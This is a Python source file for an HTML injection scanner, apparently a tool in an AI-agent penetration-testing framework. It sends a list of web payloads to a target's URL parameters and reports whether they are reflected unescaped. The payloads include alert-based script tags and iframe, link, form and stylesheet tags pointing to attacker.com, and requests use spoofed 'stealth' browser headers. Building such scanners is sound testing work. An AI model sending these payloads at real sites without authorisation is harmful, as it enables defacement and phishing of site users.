"""
HTML INJECTION SCANNER
======================
Test for HTML injection vulnerabilities.
Injects HTML tags into response contexts to detect stored/reflected HTML injection.

Usage:
    from tools.html_injection_scanner import html_injection_scanner
"""

import json
import requests
import re
from urllib.parse import quote, urlparse
from langchain.tools import tool
from core.rate_limiter import rate_limiter
from core.cancellation import check_cancelled
from core.checkpoint import require_approval
from core.auth_store import get_auth_kwargs
from engines.stealth_engine import stealth

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    pass


def _domain_of(url: str) -> str:
    try:
        return urlparse(url).netloc.split(":")[0].lower()
    except Exception:
        return url


def _logger():
    from tools.custom_tools import exec_logger
    return exec_logger


# HTML Injection payloads (non-JS, visual impact)
HTML_PAYLOADS = [
    # Visual defacement
    ('<h1>HACKED</h1>', "h1", "Heading injection"),
    ('<b>BOLD</b>', "<b>", "Bold text injection"),
    ('<i>ITALIC</i>', "<i>", "Italic text injection"),
    ('<u>UNDERLINE</u>', "<u>", "Underline injection"),
    ('<marquee>SCROLL</marquee>', "<marquee>", "Marquee injection"),
    ('<blink>FLASH</blink>', "<blink>", "Blink injection"),

    # Image injection
    ('<img src="x" onerror="alert(1)">', "<img", "Image tag injection"),
    ('<img src="https://attacker.com/track.gif">', "attacker.com", "Image tracking pixel"),

    # Link injection
    ('<a href="https://attacker.com">Click Here</a>', "attacker.com", "Link injection"),
    ('<a href="javascript:alert(1)">Click</a>', "javascript:", "JavaScript link injection"),

    # Iframe injection
    ('<iframe src="https://attacker.com"></iframe>', "attacker.com", "Iframe injection"),
    ('<iframe src="javascript:alert(1)"></iframe>', "javascript:", "JavaScript iframe injection"),

    # Form injection
    ('<form action="https://attacker.com"><input type="submit" value="Click"></form>', "attacker.com", "Form injection"),

    # CSS injection
    ('<style>body{background:red}</style>', "background:red", "CSS injection"),
    ('<link rel="stylesheet" href="https://attacker.com/style.css">', "attacker.com", "External CSS injection"),

    # SVG injection
    ('<svg onload="alert(1)"></svg>', "<svg", "SVG injection"),
]


@tool("html_injection_scanner")
def html_injection_scanner(url: str, params: str = "") -> str:
    """
    Scan for HTML injection vulnerabilities.
    Tests injecting HTML tags into response contexts (stored/reflected).

    Args:
        url: Target URL
        params: Comma-separated parameter names to test
    """
    tool_name = "HTML Injection Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting HTML injection scan on {url}")
    if check_cancelled(logger): return "CANCELLED: job cancelled by user."

    approved = require_approval(
        action=f"HTML injection scan on {url}",
        context=f"Inject HTML tags into {params or 'default'} parameters",
        risk="low",
        exec_logger=logger,
    )
    if not approved:
        return "CANCELLED: approval rejected or timeout."

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)

    param_list = [p.strip() for p in params.split(",")] if params else [
        "name", "comment", "bio", "description", "message",
        "title", "body", "content", "text", "note", "q", "search",
    ]

    vulnerabilities = []
    tested = 0

    # Capture baseline
    try:
        rate_limiter.wait(domain)
        baseline = requests.get(url, timeout=8, verify=False, **auth_kwargs)
        baseline_len = len(baseline.text)
    except Exception:
        baseline_len = 0

    logger.add_log(tool_name, "PROCESSING", f"Testing {len(param_list)} params x {len(HTML_PAYLOADS)} payloads")

    for param in param_list:
        if check_cancelled(logger): break

        for payload, indicator, description in HTML_PAYLOADS:
            try:
                rate_limiter.wait(domain)
                test_url = f"{url}{'&' if '?' in url else '?'}{param}={quote(payload)}"

                stealth_headers = stealth.get_browser_headers(test_url)
                resp = requests.get(
                    test_url,
                    headers=stealth_headers,
                    timeout=5,
                    verify=False,
                    **auth_kwargs,
                )
                tested += 1

                # Check if HTML payload is reflected unescaped
                if payload in resp.text:
                    vulnerabilities.append({
                        "parameter": param,
                        "payload": payload,
                        "type": "HTML Injection (Reflected)",
                        "description": description,
                        "severity": "Medium",
                        "evidence": f"HTML payload reflected in response body",
                        "status_code": resp.status_code,
                    })
                    logger.add_log(tool_name, "WARNING",
                        f"HTML injection: param={param}, type={description}")
                    break  # One confirmed per param is enough

            except Exception:
                continue

    result = {
        "status": "VULNERABLE" if vulnerabilities else "SAFE",
        "vulnerabilities": vulnerabilities,
        "count": len(vulnerabilities),
        "total_tested": tested,
        "params_tested": param_list,
    }

    logger.add_log(tool_name, "SUCCESS",
        f"HTML injection scan complete. {tested} tests, {len(vulnerabilities)} findings")
    return json.dumps(result, indent=2)
